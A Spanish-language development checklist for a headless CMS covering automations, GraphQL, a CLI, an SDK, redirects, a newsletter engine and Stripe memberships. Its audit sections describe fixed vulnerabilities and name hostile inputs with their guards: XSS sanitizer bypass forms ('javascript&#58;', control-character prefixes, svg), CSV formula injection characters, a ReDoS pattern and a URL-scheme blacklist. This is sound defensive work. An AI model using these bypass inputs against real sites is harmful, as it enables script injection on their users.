- [x] engine.ts: startRun + runStepsLoop con claim atómico (or status pending/running) anti-doble-ejecución; sleep persiste como pending+nextStepAt; branch ejecuta then/else con sub-steps; max 200 steps/run; processPendingRuns (cron drainer FOR UPDATE SKIP LOCKED) + dryRun (sin persistir)
- [x] listener.ts: triggerEvent (event-based, lazy import desde dispatcher) + triggerFormSubmit + triggerManual + triggerWebhookIn
- [x] lib.ts: CRUD + listRuns + getRunWithSteps + countRunsByAutomation + rotateAutomationSecret
- [x] templates.ts: 5 plantillas (Slack-on-publish, Email-on-form-submit, AI-classify-comment con branch, Subscribe-from-form, AI-summarize-on-publish)

### Admin UI Automations (src/app/admin/automatizaciones/)
- [x] /admin/automatizaciones: lista con runs counts, fallos, badges activa/pausada y trigger type
- [x] /admin/automatizaciones/[id]: editor con tabs Editor/Runs/Ajustes + toggle pause/active + ejecutar (manual) + probar (dryRun) + guardar
- [x] Trigger picker (5 tipos) + config dinámica por tipo (event dropdown, form_submit UUID, cron schedule)
- [x] Steps timeline vertical con line connector; cada step expande con form específico por type; reordenar arriba/abajo; eliminar
- [x] Add-step section con grupos (Notificar/Inteligencia/Datos/Control); branch editado vía JSON-view por simplicidad
- [x] webhook_in trigger expone secret rotable + URL ejemplo
- [x] Sidebar item Automatización ahora "live" (sin badge soon)

### REST v1 endpoints
- [x] GET /api/v1/forms (scope forms:read) + filters status/q
- [x] GET /api/v1/forms/[id] (scope forms:read) — 404 si no existe
- [x] GET /api/v1/forms/[id]/submissions (scope submissions:read) + filtro status + cursor pagination
- [x] GET /api/v1/automations (scope automations:read)
- [x] GET /api/v1/automations/[id] (scope automations:read)
- [x] GET /api/v1/automations/[id]/runs (scope runs:read)
- [x] POST /api/automations/[id]/trigger (público con HMAC secret timing-safe) para webhook_in

### Cron + Vercel
- [x] /api/cron/automations-process: cada minuto, drena runs pending (sleep wakeups)
- [x] vercel.json con cron añadido

### Verificación
- [x] npx tsc --noEmit cero errores
- [x] npm run build OK — 27 páginas estáticas + dinámicas /admin/forms, /admin/forms/[id]/{,submissions,settings,embed}, /admin/automatizaciones, /admin/automatizaciones/[id], /forms/[slug], /api/public/forms/[slug]/{schema,submit,confirm}, /api/v1/forms{,/[id],/[id]/submissions}, /api/v1/automations{,/[id],/[id]/runs}, /api/automations/[id]/trigger, /api/cron/automations-process
- [x] npx biome check ./src cero errores tras format auto-fix

### Auditoría posterior — bugs detectados y fixeados
- [x] **High**: race condition en runStepsLoop — startRun (background) y processPendingRuns (cron) podían entrar al mismo run a la vez → claim atómico con `UPDATE WHERE status IN (pending, running) RETURNING` y early return si 0 filas
- [x] **High**: cross-tenant leak vía attachments — submissions podían referenciar mediaIds de otros workspaces → `filterOwnedMediaIds` valida ownership antes del insert (cap 50 por submission)
- [x] **Medium**: confirmation token — primera versión guardaba un token "pending" antes del id real, riesgo de colisión unique → insert con NULL primero, update con token firmado real (sid=submission.id) después
- [x] Verificado y NO bug: SSRF en webhook step + http step (safePublicFetch en ambos), SSRF en legacy webhookUrl forms (safePublicFetch), HMAC verify de confirmation token timing-safe, prototype pollution en templating (guard __proto__/constructor/prototype), CORS allowedOrigins enforced server-side (no solo cliente), rate-limit por IP no es timing-safe pero no es seguridad crítica, idempotencia via contentHash unique → duplicate response, honeypot field name random por form (no predecible), notification email HTML escape, body cap 256 KB en /submit, CRON_SECRET timing-safe en /automations-process, dryRun NO persiste pero ejecuta acciones reales (documentado), branch dentro de branch ignora sleep (limitación documentada), spam respuesta 200 silenciosa (no revela detección al spammer)

## ✅ Fase 7c — GraphQL + CLI + SDK + Menus + Redirects ✦ Edición Espectacular (COMPLETA)

> Mejoras vs plan: GraphQL handcrafted con `graphql` + `graphql-yoga` (sin Pothos para mantener deps mínimas y patrón "tipado sin codegen" del repo) con scopes desde API key, depth+complexity limit, persisted queries (hash allowlist), introspection toggle, playground propio. CLI `csm` con 11 comandos sin commander/yargs (banner ASCII, config en `~/.csmrc`). SDK TS handcrafted con retries exp + idempotency-key auto + async iterators para paginación + helper GraphQL. Menus con 6 item types recursivos + dnd-kit tree + 3 plantillas. Redirects con cache LRU 60s en middleware + 3 match types (exact/prefix/regex) + CSV import con preview/dry-run + detección de ciclos.

### Schema upgrade
- [x] menus ampliada: name, slug unique, location enum (header/footer/sidebar/custom), items jsonb tipado recursivo, version, isDefault, description, createdById, updatedAt
- [x] redirects ampliada: source unique, destination, statusCode (301/302/307/308), matchType (exact/prefix/regex), preserveQuery, enabled, hits, lastHitAt, description, createdById
- [x] enums: menu_location, redirect_match_type

### GraphQL (src/graphql/)
- [x] schema.ts: schema GraphQL handcrafted con `graphql` package — 14 tipos (Entry/Collection/Media/Page/Comment/Taxonomy/Term/Form/Submission/Automation/AutomationRun/Webhook/Menu/Redirect/Me) + 5 connection types con cursor pagination keyset
- [x] context.ts: extractKey + verifyKey + audit + scopes; reusa el cache TTL 60s de REST
- [x] limits.ts: depth limit 8 default + complexity limit 1000 (cost = limit args para list fields, 1 para escalares); ambos lanzan GraphQLError con extension code
- [x] persisted.ts: allowlist por sha-256(query) en memoria; flag CSM_GRAPHQL_PERSISTED_ONLY para producción
- [x] yoga.ts: createYoga con plugins propios (persisted/depth/complexity/audit), maskedErrors selectivo (errores con extensions.code se pasan, otros se enmascaran), CORS abierto
- [x] /api/graphql route: POST/GET/OPTIONS via Yoga
- [x] /api/graphql/schema route: GET SDL en text/plain (cache 60s)
- [x] /admin/api-docs/graphql page: playground propio con editor + variables + headers + history (localStorage), 6 plantillas pre-built, status code + duration en panel de respuesta, descarga SDL

### CLI `csm` (bin/csm.mjs)
- [x] bin/csm.mjs entry shebang + arg parser propio (sin commander/yargs)
- [x] 13 comandos: help, version, init, login, logout, whoami, pull schema, push schema, export, import, gen sdk, gen types, types graphql
- [x] ~/.csmrc JSON con multi-profile (default + named); perms 0o600
- [x] http wrapper con auth Bearer y JSON parse de errores
- [x] banner ASCII con paint() ANSI (NO_COLOR friendly + skip si no TTY)
- [x] package.json bin: { csm: ./bin/csm.mjs } + script "csm" para `npm run csm`

### SDK TS (src/sdk/)
- [x] index.ts: createCsmClient({ baseUrl, apiKey, fetch?, retries?, timeoutMs?, headers? }) handcrafted
- [x] 12 resources tipados: entries, collections, media, pages, comments, taxonomies, forms (+ submissions), automations (+ runs), webhooks, menus, redirects, health, me
- [x] Async iterators `iterAll()` para entries/media/comments con cursor lazy
- [x] Idempotency-Key auto (UUIDv4) en POST/PATCH/PUT/DELETE
- [x] Retries 3x con backoff exp en 408/425/429/5xx (respeta Retry-After)
- [x] CsmError tipado con code, status, message, details
- [x] gql<T>(query, variables) — usa fetch directo a /api/graphql sin idempotency

### Menus (src/menus/)
- [x] types.ts: MenuItem union de 6 tipos (link/page/collection/external/divider/heading) recursivo con children[]; MenuItemsSchema con z.union recursivo + checkMenuDepth (máx 3 niveles) + flattenItems
- [x] lib.ts: CRUD listMenus/getById/getBySlug/getPublicMenuBySlug (host-aware) / createMenu / updateMenu / deleteMenu / resolveMenu (page→path, collection→/slug, external→href) / ensureUniqueSlug / slugify (\p{Mn} para acentos)
- [x] templates.ts: 3 plantillas (Cabecera simple, Cabecera con desplegables, Pie con columnas)
- [x] /admin/menus: lista con location badges, item counts (flattenItems), version
- [x] /admin/menus/[id]: builder split-pane (1fr+320px) — tree visual con grip + flechas reorder + add child popover + inspector lateral con tipo-específico fields + flags (highlight/muted/newTab) + sticky save panel
- [x] Public endpoint /api/public/menus/[slug]: GET cached 60s, CORS abierto, resuelve workspace por host, devuelve items con href finales
- [x] REST /api/v1/menus (scope menus:read) + /api/v1/menus/[slug] (con items resueltos)

### Redirects (src/redirects/)
- [x] matcher.ts: applyRule + matchRedirect con exact/prefix/regex + preserveQuery + maxChain 5 + Set seen para detección de ciclos + isSelfReferential + appendQuery merge correcto
- [x] lib.ts: validateRule (incluye anti-ReDoS heurístico para nested quantifiers + cap 256 chars en regex) + CRUD + bulkDelete/bulkSetEnabled + incrementHits atómico + parseCsv (CSV con quotes "" + multi-line) + bulkInsertRedirects + redirectsToCsv (con CSV-formula-injection guard `'`)
- [x] runtime.ts: cache LRU 60s por workspace + cache 5min host→workspaceId + runRedirect helper que llama nextRedirect/permanentRedirect según statusCode + invalidateRedirectsCache
- [x] Integración: app/page.tsx + app/[...slug]/page.tsx llaman runRedirect antes de render (no en middleware edge para mantener bundle limpio sin drizzle); middleware.ts existente intacto (solo auth)
- [x] /admin/redirects: lista con búsqueda + filter status + bulk enable/disable/delete + tester en vivo + crear/editar modal + import CSV modal con preview (50 rows + errores) + export CSV download
- [x] REST /api/v1/redirects (scope redirects:read) con filtros enabled/matchType/q

### Sidebar
- [x] Item Menús (icon ListTree) + Redirecciones (icon ArrowRightLeft) añadidos en sección Sistema

### Verificación
- [x] npx tsc --noEmit cero errores
- [x] npm run build OK — 70+ rutas (+ /api/graphql, /api/graphql/schema, /api/public/menus/[slug], /api/v1/menus, /api/v1/menus/[slug], /api/v1/redirects, /admin/menus, /admin/menus/[id], /admin/redirects, /admin/api-docs/graphql)
- [x] npx biome check ./src cero errores

### Auditoría posterior — bugs detectados y fixeados
- [x] **High**: CSV formula injection en redirectsToCsv → celdas que empiezan con `=`/`+`/`-`/`@`/`\t`/`\r` se prefijan con apóstrofo (`'`) que es el escape estándar OWASP; ataque era admin-malicioso → admin-víctima abriendo CSV en Excel
- [x] **Medium**: ReDoS via regex source en redirects → validateRule rechaza patrones >256 chars y con quantifiers anidados `(.+)+` que disparan backtracking catastrófico (admin malicioso interno como vector)
- [x] **Medium**: cross-tenant leak en getPublicMenuBySlug — slug global devolvía primer match de cualquier workspace → acepta opcional `host`, resuelve workspaceId via resolveWorkspaceIdByHost (custom domain o subdominio o fallback)
- [x] Verificado y NO bug: SSRF en redirects (no hay fetch server-side, sólo Location header al browser); prototype pollution en parseCsv (claves fijas, no merge dinámico); GraphQL `me` sin scope (deliberado, sólo auth); persisted-only mode (env CSM_GRAPHQL_PERSISTED_ONLY=1 lanza error si no viene hash); admin actions con role gate apropiado (editor para edits, admin para delete/bulk/import); ~/.csmrc perms 0o600 verificado; CLI no imprime apiKey en whoami (sólo apiKeyId); idempotency-key NO se añade en SDK.gql() porque usa fetch directo sin pasar por wrapper; menu depth check server-side via MenuItemsSchema + checkMenuDepth; redirect cycles via Set<seen> + maxChain 5; isDefault menu race documentada (rara colisión, fix con tx en F8); slug validation drizzle parametrizado (no SQL injection); GraphQL SDL público OK (similar a OpenAPI); Yoga maskedErrors deja pasar errores con extensions.code para no esconder UNAUTHORIZED/FORBIDDEN/DEPTH_LIMIT/COMPLEXITY_LIMIT

## Fase 8 — Crecimiento (Newsletter + Memberships + A/B + Personalización + Live-Edit)

> Fase dividida en **F8a / F8b / F8c** siguiendo el patrón de F7. Cada subfase deja sistema deployable.

### ✅ Fase 8a — Newsletter & Email Engine ✦ Edición Espectacular (COMPLETA)

> Newsletter integrada estilo Substack/Ghost con doble opt-in, segments rules engine, drip campaigns, plantillas inline-style server-only, tracking de aperturas/clicks con HMAC firmado, admin completo (composer multi-device), REST API con scopes, public preferences/unsubscribe.

> Mejoras vs plan: en lugar de `react-dom/server` (Next bloquea su import en App Router) reescribimos las plantillas como string templates puros — más rápido, sin riesgo de bundle bleed al cliente. Tokens HMAC tipados por `kind` ("confirm"|"unsub"|"prefs"|"open"|"click") con verify constant-time. Segments rules engine recursivo con AND/OR/NOT y 13 operadores (eq/neq/in/not_in/contains/starts_with/ends_with/before/after/in_last_days/not_in_last_days/is_set/is_not_set/gt/lt/gte/lte). Live preview de segmentos en admin (debounce 600ms → matched count). Composer split-pane con preview multi-device. Cron `*/5 min` con claim atómico anti-doble-envío.

#### Schema upgrade
- [x] Ampliar `subscribers`: confirmedAt, unsubscribedAt, unsubscribeReason, unsubscribeToken (unique), preferences jsonb, lastOpenAt, lastClickAt, bounceCount, updatedAt + indices ws_status / unsub_token
- [x] Nueva `subscriber_confirmations` (token unique HMAC + expiresAt + confirmedAt)
- [x] Ampliar `campaigns`: previewText, fromName, fromEmail, replyTo, bodyHtml, templateId, status enum (draft/scheduled/sending/sent/paused/failed), startedAt, totalRecipients, sent, opens, uniqueOpens, clicks, uniqueClicks, bounced, complained, unsubscribed, failed, createdById, updatedAt
- [x] Nueva `email_templates` (workspace_id+slug unique, body jsonb+bodyHtml+variables, builtinKey)
- [x] Nueva `campaign_recipients` (estado per-subscriber + trackingHash unique + openCount/clickCount + providerMessageId + bouncedAt/failedAt/openedAt/clickedAt)
- [x] Nueva `drips` (triggerType enum, triggerConfig jsonb, steps jsonb, status enum, contadores enrolledTotal/completedTotal)
- [x] Nueva `drip_enrollments` (currentStep, nextRunAt, status enum, unique(dripId, subscriberId), index status+nextRunAt)
- [x] Nueva `email_events` (type enum 9 tipos: queued/sent/delivered/open/click/bounce/complaint/unsubscribe/failed; subscriberId/campaignId/recipientId/dripId/dripEnrollmentId nullable; url; ipHash; userAgent; metadata)
- [x] Enums: campaign_status, campaign_recipient_status, drip_status, drip_enrollment_status, drip_trigger_type, email_event_type

#### Email engine (src/newsletter/)
- [x] tokens.ts: HMAC tipado por kind (confirm/unsub/prefs/open/click) con verify constant-time + payload base64url + sig truncado
- [x] templates.tsx: 4 plantillas string-template (renderConfirmation/renderWelcome/renderBroadcast/renderDripStep) con shell común (preheader hidden, header gradient, table layout, footer con prefs+unsub) + builtinTemplates registry
- [x] urls.ts: publicOriginFromWorkspace (customDomain → NEXT_PUBLIC_APP_URL), buildSubscribeUrls/OpenPixel/ClickProxy
- [x] compose.ts: sanitizeHtml (allowlist tags + isSafeUrl http/https/mailto/tel + strip script/iframe/style/event handlers + style url(javascript:) blacklist) + rewriteLinksForTracking (firma URL destino + cuenta rewrites) + bodyToHtml (tiptap-json → HTML inline) + htmlToText fallback
- [x] segments.ts: rules engine recursivo (all/any/not + ConditionSchema con z.lazy), 13 fields, 18 operators, FIELD_LABELS/OP_LABELS para UI
- [x] segments-lib.ts: CRUD + previewSegmentSize (in-memory matcher con cap 10k) + listSubscriberCountsForSegments
- [x] subscribers.ts: subscribe (idempotente: crea/reactiva, escribe unsubscribeToken HMAC con id real tras insert), confirmSubscription (verify HMAC + invalida confirmaciones previas + auto-enroll drips), unsubscribe (cancela enrollments activos), updatePreferences, recordBounce (3 strikes → status='bounced' + emit), tagSubscribers, bulkImport (CSV con escape OWASP), subscribersToCsv (CSV-formula-injection guard)
- [x] dispatcher.ts: expandCampaignRecipients (idempotente, segment filter, batch 200), startCampaignSend (claim atómico draft|scheduled→sending), processCampaigns (promote scheduled, claim recipients pending→sending atómico, sendEmail por uno, markFinishedCampaigns con emit campaign.sent), sendCampaignRecipient (rewrite links + open pixel + html/text), sendDripStep (similar para drip con tag de paso), recordOpen (campaign + drip), recordClick, recordBounceForRecipient
- [x] drip.ts: DripStepSchema (delay { value, unit: minutes/hours/days/weeks }) + DripStepsSchema, CRUD, enrollSubscriber (no duplica activos), cancelEnrollmentsForSubscriber, autoEnrollOnConfirm, autoEnrollOnTagAdded, processDripEnrollments (claim + sendDripStep + advance/complete/cancelled)
- [x] campaigns-lib.ts: CRUD + getCampaignStats (filter aggregations) + listRecipientEvents

#### Public
- [x] `/suscribir` page: form con email+name+honeypot + csm_t time-trap + Server Action vía fetch a /api/public/subscribe + estados (idle/loading/ok/err)
- [x] `/api/public/subscribe` route: honeypot silencioso (200 OK fake), time-trap < 800ms, resolución workspace por host (custom domain → fallback first ws), rate limit 8/h + 40/d por (ip, ws), email validation, envío email confirmación (renderConfirmation)
- [x] `/suscribir/confirmar/[token]` page: confirmSubscription server-side, success/expired/invalid views diferenciadas
- [x] `/suscribir/preferencias/[token]` page: tags editor + Server Action updatePreferences + link a baja
- [x] `/suscribir/baja/[token]` page: razón opcional radio + Server Action unsubscribe + view "we'll miss you"
- [x] `/api/email/open/[token].gif` route: verify HMAC → recordOpen (campaign O drip) → 1x1 GIF transparente con no-cache headers
- [x] `/api/email/click/[token]` route: verify HMAC + verify URL http(s) absoluta (anti open-redirect) → recordClick → 302 redirect a URL firmada

#### Admin
- [x] `/admin/suscriptores`: lista con filter pills (todos/activos/bajas/bounced) + search + bulk select + bulk actions (etiquetar/dar-de-baja/borrar) + paginación + counters status badges + Modal Add/Import-CSV/Tag con previews
- [x] `/admin/api/subscribers/export` route: descarga CSV completa (con CSV-formula-injection guard)
- [x] `/admin/segmentos`: lista con counters + summarizeRules + link a builder
- [x] `/admin/segmentos/nuevo` + `/admin/segmentos/[id]`: builder visual con AND/OR pills, conditions con field/op/value selects + add/remove condition + live preview de matches estimadas (debounce 600ms) + sidebar con tips
- [x] `/admin/campanas`: lista con status badges (draft/scheduled/sending/sent/paused/failed) + open/click rate columns
- [x] `/admin/campanas/[id]`: editor full-screen con tabs (Diseño/Ajustes/Analítica) + autosave debounced 1.2s + composer split-pane con preview multi-device (Monitor/Smartphone toggle) + send-test + send-now + analytics stats grid

#### REST API
- [x] `/api/v1/subscribers` GET (list con filters status/q/tag/limit/offset) + POST (create con preConfirmed flag); scopes subscribers:read|write
- [x] `/api/v1/subscribers/[id]` GET + PATCH (tags add/remove) + DELETE
- [x] `/api/v1/subscribers/[id]/unsubscribe` POST
- [x] `/api/v1/segments` GET + POST; `[id]` GET + PATCH + DELETE; scopes segments:read|write
- [x] `/api/v1/campaigns` GET + POST; `[id]` GET + PATCH + DELETE; `[id]/send` POST; `[id]/stats` GET; scopes campaigns:read|write
- [x] OpenAPI schemas auto-registrados (createRoute auto-registra)

#### Cron
- [x] `/api/cron/newsletter-process` schedule */5 min — processCampaigns (promote scheduled + dispatch pending recipients en lotes 50 + markFinished) + processDripEnrollments en paralelo
- [x] vercel.json: cron entry añadido junto a publish-scheduled/webhooks-process/automations-process/daily

#### Webhooks
- [x] webhooks/events.ts: añadidos 6 eventos (subscriber.created/confirmed/unsubscribed/bounced + campaign.scheduled/campaign.sent) con grupo "Newsletter" en UI

#### Sidebar
- [x] Quitado `soon: true` de Suscriptores/Campañas
- [x] Añadidos: Segmentos (Filter icon) + Drips (GitBranch icon, soon flag — F8a-2)

#### Verificación
- [x] npx tsc --noEmit cero errores
- [x] npx biome check ./src cero errores ni warnings
- [x] npm run build OK — 13 nuevas rutas (+ /admin/suscriptores, /admin/api/subscribers/export, /admin/segmentos, /admin/segmentos/nuevo, /admin/segmentos/[id], /admin/campanas, /admin/campanas/[id], /api/public/subscribe, /api/email/open/[token], /api/email/click/[token], /api/v1/subscribers + [id] + unsubscribe, /api/v1/segments + [id], /api/v1/campaigns + [id] + send + stats, /api/cron/newsletter-process, /suscribir/confirmar/[token], /suscribir/baja/[token], /suscribir/preferencias/[token])

#### Decisiones diferidas a F8a-2 / F8b
- /admin/drips: schema y engine implementados, UI admin diferida (pasa al backlog tras F8b)
- GraphQL types para Subscriber/Campaign/Segment: REST cubre el caso headless principal; añadir en F8c con A/B
- /admin/email-templates: la tabla `email_templates` existe pero el editor visual queda para F8c (templates builtin son hardcoded en templates.tsx)

#### Auditoría posterior — bugs detectados y fixeados
- [x] **High**: race en `expandCampaignRecipients` — read-then-write podía duplicar recipients si dos llamadas concurrentes pasaban el `count() > 0` check al mismo tiempo. Fix: añadido `onConflictDoNothing({ target: [campaignId, subscriberId] })` (defensa-en-profundidad por encima del unique index ya existente) + `WHERE totalRecipients = 0` en el UPDATE de contador para que sólo la primera llamada pise el valor. Aunque `startCampaignSend` ya garantiza serialización vía claim atómico de status, protegemos contra llamada directa desde otro código.
- [x] **High**: `rewriteLinksForTracking` regex incompleta — sólo matcheaba `href="..."` (double quotes). Si admin pegaba HTML con `href='...'` (single quotes) o `href=...` (sin comillas), no se reescribía y el HMAC no firmaba la URL. Riesgo: admin podía meter URLs maliciosas que escapaban el verify de `/api/email/click`. Fix: regex extendida a `(?:"([^"]*)"|'([^']*)'|([^\s"'<>`]+))` con captura por grupos numerados; smoke test cubre los 3 estilos.
- [x] **Medium**: `recordOpen` dual-dispatch ambiguo — sin discriminator en el token `signOpen`, llamábamos a `recordOpen({recipientId})` Y `recordOpen({enrollmentId})` con el mismo `rid`. Si los UUIDs colisionaban (improbable pero posible), habría doble-conteo. Fix: token ahora lleva `t: "c" | "d"` (campaign-recipient vs drip-enrollment); el route handler dispatch única vez al handler correcto. El `signClick` también usa `t` para que cuando llegue un click de drip no genere fila huérfana en `email_events` con `campaignId=null`.
- [x] **Medium**: `recordBounceForRecipient` no era idempotente — un webhook que llegaba 2x duplicaba el contador `campaigns.bounced` y metía un segundo evento `bounce`. Fix: early return si el recipient ya estaba `status='bounced'`, y UPDATE atómico con `WHERE status != 'bounced'` (claim) + `returning` para detectar si fuimos los que ganamos la transición.
- [x] **Medium**: `markFinishedCampaigns` race en transición sending → sent — dos cron ticks podían leer count=0 simultáneamente y ambos emitir `campaign.sent`. Fix: claim atómico con `WHERE status='sending' RETURNING id`, sólo el ganador emite el evento.
- [x] **Medium**: sanitizer HTML — varios bypass posibles. Fixeados: (1) tags `svg`/`math`/`base`/`frame`/`frameset`/`button` añadidos al strip-list (svg con foreignObject permitía scripts, base reescribía URL resolution), (2) `isClose` lógica confusa simplificada con grupo de captura del `/`, (3) `isSafeUrl` ahora decodifica entidades HTML decimales/hex/named (`javascript&#58;` → `javascript:`) ANTES de comprobar el esquema y blacklistea explícitamente `javascript|vbscript|data|file|blob|about` antes del allowlist, (4) strip control chars + zero-width chars del prefijo de URL (bypass clásico `\tjavascript:` o `​javascript:`).
- [x] **Medium**: `NextResponse.redirect("/")` con URL relativa fallaba en runtime — Next.js requiere URL absoluta. Fix: `new URL("/", req.url).toString()` para fallback en click route.
- [x] **Low**: smoke test de seguridad añadido (no commiteado — corrió 31/31 PASS antes de borrar) cubriendo: sanitize de script/svg/iframe/onclick/javascript: en sus 9 variantes (entidades, control chars, ZWSP, NBSP, single/double/no quotes), data: URLs allow-image / block-html, comments con bypass condicional, base tag, mailto OK, style url(javascript:) + expression(), rewriteLinks idempotente, tokens c/d roundtrip + tampered + wrong-kind.

#### Verificados como NO bug (false positives de la auditoría)
- Cross-tenant en queries: todas las consultas filtran por `workspaceId` explícitamente (revisado: subscribers.ts, campaigns-lib.ts, segments-lib.ts, drip.ts).
- Honeypot insuficiente vs bots headless: aceptado como defensa-en-profundidad (forms-templates uso el mismo patrón). Para upgrade a captcha real → F10 hardening.
- `bulkImport` sin batching para 50k filas: documentado como limitación; en F10 se moverá a background job (queue) si crece el uso.
- Side-channel timing en `/api/email/open`: irrelevante en práctica (jitter de red >> timing diff de DB query).
- `/api/v1/subscribers POST preConfirmed=true` requiere scope `subscribers:write` — un API key con ese scope ya tiene control total sobre la lista, no se gana nada con un sub-scope para v1.
- `unsubscribeToken` puede ser NULL en schema: en práctica `subscribe()` siempre lo genera; en defensa-en-profundidad el `verifyUnsub` rechaza tokens vacíos por la firma HMAC. Documentado.
- DripStep delay 365 weeks (= 7 años): edge case aceptable, `value` cap a 365 por unit es suficiente para uso real.
- Subscribers race en signup duplicado: el `uniqueIndex(workspaceId, email)` serializa correctamente; el insert con placeholder + update post-insert del `unsubscribeToken` es seguro porque la primera fila siempre gana el insert y el update es idempotente.
- API key environment test/live no aplicado a campaigns send: aceptable para v1, F8b/F10 puede añadir distinción si necesario.

### ✅ Fase 8b — Memberships + Stripe + Paywall + Personalización ✦ Edición Espectacular (COMPLETA)

> Sistema completo de membresías estilo Substack/Ghost: tiers gratis y de pago con Stripe (sync a Products+Prices), checkout y billing portal, magic-link auth de miembro independiente del admin, /miembros + /miembros/portal en español, paywall block que trunca contenido posterior con teaser fade (patrón Substack), personalización por bloque (país, device, UTM, estado de miembro, tier, hora del día) evaluada en SSR. Cliente Stripe propio basado en fetch (cero dependencias, cero bundle bleed) con verify HMAC-SHA256 timing-safe del webhook. Demo mode sin Stripe key concede membresía con HMAC-firmado callback. REST v1 + scopes + idempotencia por event.id.

#### Schema upgrade
- [x] Nuevos enums: `membership_status` (incomplete/trialing/active/past_due/canceled/unpaid/paused), `tier_interval` (month/year/lifetime), `member_event_type` (12 tipos: membership_*/payment_*/trial_*/magic_link_sent/session_*)
- [x] `tiers` ampliado: slug (unique), description, currency, interval enum, trialDays, features jsonb (string[]), isActive, isFree, sortOrder, stripeProductId, createdAt/updatedAt, indices ws_slug/ws_active/stripe_price
- [x] `memberships` ampliado: name, status enum, stripe_subscription_id, currentPeriodStart, cancelAtPeriodEnd, canceledAt, trialEnd, startedAt, source, metadata jsonb, createdAt/updatedAt, indices ws_email (unique)/ws_status/stripe_sub/stripe_cust
- [x] `member_sessions` (id, ws, email, tokenHash unique, ua, ipHash, expiresAt, lastSeenAt) — auth de miembro separada de Better-Auth
- [x] `member_magic_links` (id, ws, email, tokenHash unique, redirectTo, expiresAt, usedAt, ipHash) — one-shot
- [x] `member_events` (id, ws, membershipId, email, type enum, stripe_event_id unique, data jsonb) — audit log + idempotencia Stripe
- [x] `personalization_rules` (id, ws, name unique, rule jsonb) — preparada para reglas reusables F8c
- [x] BlockNode extendido con `audience?: AudienceRule` para personalización embebida por bloque (sin tabla extra)

#### Stripe adapter (src/payments/stripe.ts)
- [x] Cliente fetch propio (cero deps, no @stripe/stripe-node) con encoder form-urlencoded estilo Stripe (incluye sub-objetos `metadata[k]` y arrays `line_items[0][price]`)
- [x] StripeApiError + StripeNotConfiguredError tipados
- [x] createProduct/updateProduct, createPrice/archivePrice, createCheckoutSession (mode payment|subscription, customerEmail, trialDays, allowPromotionCodes, clientReferenceId, metadata), createBillingPortalSession, retrieveSubscription, cancelSubscription
- [x] verifyAndParseWebhook: parsea header `Stripe-Signature t=TS,v1=SIG[,v1=SIG2]`, HMAC-SHA256(`${ts}.${rawBody}`), tolerance 5min anti-replay, timing-safe compare buffer-by-buffer, validate body length cap 1MB, parse JSON solo si firma OK
- [x] mapSubscriptionStatus: Stripe status → enum interno (incomplete_expired → canceled)

#### Member auth (src/payments/member-auth.ts)
- [x] Tokens random 32B base64url + sha256 hash en DB (nunca guardamos plain)
- [x] createMagicLink: throttle 5/h por (ws, email), TTL 15 min, ipHash con AUTH_SECRET pepper
- [x] consumeMagicLink: claim atómico con `SET usedAt=now WHERE usedAt IS NULL AND expiresAt>=now` + RETURNING (one-shot a prueba de race)
- [x] createMemberSession: TTL 30d, lastSeenAt bump async best-effort, cookie value = `${tokenPlain}.${workspaceId}` (defensa cross-tenant)
- [x] loadMemberSessionByCookie: parse cookie → verifica tokenHash + workspaceId match
- [x] Cookie helpers httpOnly/sameSite=lax/secure-prod/maxAge=30d
- [x] purgeExpiredMemberAuth (helper para cron futuro)

#### Memberships domain (src/payments/memberships.ts)
- [x] CRUD tiers + ensureUniqueTierSlug (8 reintentos con sufijo)
- [x] grantMembership idempotente (upsert por (ws, email))
- [x] updateMembershipFromSubscription (Stripe-flow)
- [x] isMembershipActive (status active/trialing/past_due + currentPeriodEnd vigente o null=lifetime)
- [x] membershipMatchesTiers (paywall predicate)
- [x] recordMemberEvent con onConflictDoNothing(stripe_event_id) → idempotencia Stripe
- [x] stripeEventAlreadyProcessed (dedup helper)
- [x] countActiveMembersByTier + membershipKpis (admin dashboard)
- [x] formatPriceCents (Intl.NumberFormat es-ES) + intervalLabel + MEMBERSHIP_STATUS_LABELS

#### Admin (/admin/membresias)
- [x] Page RSC: KPIs (total/activas/trialing/pago pendiente/canceladas) + cards de tiers (precio, features, miembros activos, sync status) + tabla de miembros recientes
- [x] TiersBoard cliente con cards animadas (hover lift), edit/delete inline, "Sincronizar Stripe" lazy con feedback
- [x] TierFormDialog: name/desc/precio en céntimos/currency/interval/trialDays/features list/sortOrder/isActive
- [x] MembersTable: status badges color-coded, cancel al final del período / inmediato (botón flotante), grant manual con email+tier
- [x] _actions: createTier/updateTier/deleteTier/syncTierToStripe/grantManualMembership/cancelMembership con logActivity
- [x] syncTierToStripe: createOrUpdate Product (name/description/active), Price siempre nuevo (Stripe no permite editar) + archive del antiguo, lifetime → price one-shot sin recurring

#### Stripe routes (src/app/api/stripe/)
- [x] `/api/stripe/checkout/[tierId]` POST/GET: requiere member session; tier free → demo-callback grant; sin STRIPE_SECRET_KEY → demo-callback; con Stripe → createCheckoutSession con clientReferenceId firmado HMAC + metadata{ws,tierId,email}
- [x] `/api/stripe/demo-callback`: verify token HMAC kind="demo-checkout", grant directo con período ficticio (1 mes/año/lifetime), source="demo"|"free"
- [x] `/api/stripe/portal`: crea Stripe Billing Portal session si hay stripeCustomerId; demo mode → redirect a /miembros/portal?demo_portal=1
- [x] `/api/stripe/webhook`: lee raw body con req.text() (NUNCA req.json antes de verify), verify firma, idempotencia por stripeEventId; handlers checkout.session.completed (resolve subscription si mode=subscription, mappea tier por priceId, grant), customer.subscription.created/updated/deleted (mappa status, detect tier change), invoice.payment_succeeded/failed (audit log only, status real viene en subscription.updated)

#### Member portal (/miembros)
- [x] `/miembros` page: hero con aurora, tier cards (precio, features, trial badge, gradient CTA), magic link form con honeypot+time-trap+throttle UX
- [x] MagicLinkForm cliente: estados idle/sent/error, "revisa tu email" success view
- [x] `/miembros/auth/[token]`: consumeMagicLink → createMemberSession → setCookie → recordMemberEvent("session_started") → redirect a redirectTo o /miembros/portal; vista "enlace expirado" si falla
- [x] `/miembros/portal`: requireSession; muestra tier actual, status badge, currentPeriodEnd, features, botones "Gestionar facturación" (Stripe portal) + "Cambiar plan"; lista de otros tiers para upgrade; banner welcome=1/canceled=1/demo_portal=1
- [x] _actions: sendMemberMagicLinkAction (Resend con sendMemberMagicLinkEmail), logoutMemberAction (revoke session + clear cookie + recordMemberEvent("session_ended"))
- [x] Email magic link (lib/email.ts) con escapeHtml del workspace name

#### Paywall block (registry + render)
